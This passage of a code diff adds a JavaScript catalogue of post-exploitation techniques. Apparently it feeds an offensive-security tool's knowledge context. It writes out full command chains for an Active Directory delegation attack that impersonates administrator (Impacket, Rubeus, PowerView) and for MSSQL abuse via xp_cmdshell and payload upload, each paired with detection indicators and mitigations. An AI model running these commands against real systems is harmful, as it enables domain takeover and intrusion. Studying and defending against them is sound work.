+        requiredPrivilege: "user",
+        prerequisites: [
+          "Write access to target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute",
+          "Ability to create machine accounts (default: any domain user can create up to 10)",
+          "Network access to Domain Controller for Kerberos operations"
+        ],
+        attackSteps: [
+          {
+            order: 1,
+            action: "Identify RBCD attack path",
+            description: "Use BloodHound to find computers where current user has GenericAll/GenericWrite/WriteDACL",
+            command: "MATCH (c:Computer)-[r:AllowedToActAs]->(d:Computer) RETURN r,c,d",
+            tool: "BloodHound"
+          },
+          {
+            order: 2,
+            action: "Create fake computer account",
+            description: "Add a new machine account to the domain (any user can create up to 10 by default)",
+            command: "addcomputer.py -computer-name 'fakepc$' -computer-pass 'Password@1' -dc-host dc_ip domain/user",
+            tool: "Impacket"
+          },
+          {
+            order: 3,
+            action: "Set RBCD delegation",
+            description: "Configure the target computer to trust our fake computer for delegation",
+            command: "rbcd.py -f fakepc$ -a grant -t target_dc -d domain.local",
+            tool: "Impacket"
+          },
+          {
+            order: 4,
+            action: "Request service ticket via S4U",
+            description: "Use S4U2self + S4U2proxy to get a service ticket impersonating administrator",
+            command: "getST.py -spn cifs/target.domain.local -impersonate administrator domain/fakepc",
+            tool: "Impacket"
+          },
+          {
+            order: 5,
+            action: "Use ticket for access",
+            description: "Export the ticket and use it for remote access",
+            command: "export KRB5CCNAME=administrator.ccache; psexec.py -k -no-pass target.domain.local",
+            tool: "Impacket"
+          }
+        ],
+        tools: [
+          {
+            tool: "BloodHound",
+            command: "bloodhound-python -u user -p password -ns dc_ip -d domain.local -c All",
+            description: "Map AD attack paths to find RBCD-vulnerable targets",
+            requiresAdmin: false
+          },
+          {
+            tool: "Impacket addcomputer",
+            command: "addcomputer.py -computer-name 'fakepc$' -computer-pass 'Password@1' -dc-host dc_ip domain/user",
+            description: "Create fake machine account for RBCD attack",
+            requiresAdmin: false
+          },
+          {
+            tool: "Impacket rbcd",
+            command: "rbcd.py -f fakepc$ -a grant -t target -d domain.local",
+            description: "Set RBCD delegation on target computer",
+            requiresAdmin: false
+          },
+          {
+            tool: "Impacket getST",
+            command: "getST.py -spn cifs/target.domain.local -impersonate administrator domain/fakepc",
+            description: "Request impersonated service ticket via S4U extensions",
+            requiresAdmin: false
+          },
+          {
+            tool: "Rubeus",
+            command: "Rubeus.exe s4u /user:fakepc$ /domain:domain.local /rc4:<hash> /impersonateuser:administrator /msdsspn:http/target /altservice:cifs,host /ptt",
+            description: "Windows-native S4U ticket request and injection",
+            requiresAdmin: false
+          },
+          {
+            tool: "StandIn",
+            command: "StandIn.exe --computer fakepc --make",
+            description: "Create machine account using StandIn (Windows-native)",
+            requiresAdmin: false
+          },
+          {
+            tool: "PowerView",
+            command: "Set-ADComputer target -PrincipalsAllowedToDelegateToAccount fakepc$",
+            description: "Set RBCD via PowerShell/PowerView",
+            requiresAdmin: false
+          },
+          {
+            tool: "Metasploit RBCD",
+            command: "use auxiliary/admin/ldap/rbcd",
+            description: "Automated RBCD attack via Metasploit",
+            requiresAdmin: false
+          }
+        ],
+        detectionIndicators: [
+          "New computer account creation by non-admin users",
+          "Modification of msDS-AllowedToActOnBehalfOfOtherIdentity attribute",
+          "S4U2self/S4U2proxy Kerberos requests from unusual sources",
+          "Event ID 4741 \u2014 Computer account created",
+          "Event ID 5136 \u2014 Directory service object modified (RBCD attribute)"
+        ],
+        mitigations: [
+          "Set ms-DS-MachineAccountQuota to 0 (prevent users from creating machine accounts)",
+          "Monitor for msDS-AllowedToActOnBehalfOfOtherIdentity modifications",
+          "Implement tiered administration to limit write access to computer objects",
+          "Enable Protected Users security group for sensitive accounts",
+          "Regular audit of delegation configurations in AD"
+        ]
+      }
+    ];
+    SERVICE_EXPLOIT_TECHNIQUES = [
+      {
+        id: "SVC-EXPLOIT-001",
+        name: "MSSQL Exploitation via Impacket",
+        service: "MSSQL",
+        ports: [1433],
+        description: "Comprehensive MSSQL exploitation using Impacket's mssqlclient.py. Attack chain: authenticate with weak credentials \u2192 enumerate impersonation rights \u2192 escalate to sa \u2192 enable xp_cmdshell \u2192 execute OS commands. Also covers linked server exploitation.",
+        mitreTechniqueIds: ["T1078", "T1134", "T1059.003", "T1082", "T1083", "T1105"],
+        phase: "lateral_movement",
+        tools: [
+          {
+            tool: "Impacket mssqlclient",
+            command: "mssqlclient.py domain/user:password@target_ip",
+            description: "Connect to MSSQL with credentials",
+            requiresAdmin: false
+          },
+          {
+            tool: "MSSQL impersonation check",
+            command: "check_impersonation",
+            description: "Check which users can be impersonated (IMPERSONATE privilege)",
+            requiresAdmin: false
+          },
+          {
+            tool: "MSSQL escalate to sa",
+            command: "exec_as_login sa",
+            description: "Impersonate the sa account for full database control",
+            requiresAdmin: false
+          },
+          {
+            tool: "MSSQL enable xp_cmdshell",
+            command: "enable_xp_cmdshell",
+            description: "Enable xp_cmdshell stored procedure for OS command execution",
+            requiresAdmin: false
+          },
+          {
+            tool: "MSSQL OS command execution",
+            command: "xp_cmdshell ipconfig",
+            description: "Execute OS commands via xp_cmdshell",
+            requiresAdmin: false
+          },
+          {
+            tool: "MSSQL linked servers",
+            command: "enum_links",
+            description: "Enumerate linked MSSQL servers for lateral movement",
+            requiresAdmin: false
+          },
+          {
+            tool: "MSSQL file operations",
+            command: "xp_dirtree c:\\users; upload /root/payload.exe c:\\temp\\payload.exe",
+            description: "Directory listing and file upload via MSSQL",
+            requiresAdmin: false
+          }
+        ],
+        detectionIndicators: [
+          "xp_cmdshell enablement or execution in MSSQL logs",
+          "MSSQL login from unusual source IPs",
+          "User impersonation in MSSQL audit logs",
+          "Linked server queries from unexpected sources",
+          "File operations via xp_dirtree or bulk insert"
+        ],
+        mitigations: [
+          "Disable or remove the sa account",
+          "Disable xp_cmdshell and advanced options",
+          "Audit and remove unnecessary IMPERSONATE permissions",
+          "Remove or secure linked server configurations",
+          "Use SQL authentication with strong passwords",
+          "Restrict MSSQL network access to application servers only"
+        ]
+      }
+    ];
+  }
+});
+
+export {
+  CREDENTIAL_DUMP_TECHNIQUES,
+  LATERAL_MOVE_TECHNIQUES,
+  DOMAIN_ESCALATION_TECHNIQUES,
+  SERVICE_EXPLOIT_TECHNIQUES,
+  buildCredentialDumpContext,
+  buildLateralMoveContext,
+  buildDomainEscalationContext,
+  buildServiceExploitContext,
+  buildFullPostExploitKnowledgeContext,
+  init_post_exploit_credential_knowledge
+};
